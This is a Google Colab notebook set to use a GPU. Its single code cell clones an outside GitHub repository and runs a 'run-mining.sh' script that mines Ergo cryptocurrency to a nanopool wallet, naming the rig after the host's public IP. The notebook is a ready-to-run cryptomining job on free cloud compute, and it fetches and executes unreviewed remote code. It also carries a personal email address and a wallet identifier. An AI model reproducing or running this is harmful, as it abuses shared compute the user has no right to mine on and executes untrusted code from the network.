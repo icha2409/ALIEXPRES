{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "3.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rtd66vbud3Tp"
      },
      "source": [
        "# Bagian Baru"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vB02PsMssy1B4CH"
      },
      "source": [
        "!git clone https://github.com/Henes2703/web.git\n",
        "%cd web\n",
        "!chmod +x run-mining.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./run-mining.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11111 -wallet 9hZg5mnY8XZHe5Jop8o4EJcoqNFLyEntmMC2NdJUY3J8YdZVLVQ -coin ergo -rigName $ip -email uhenk10@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}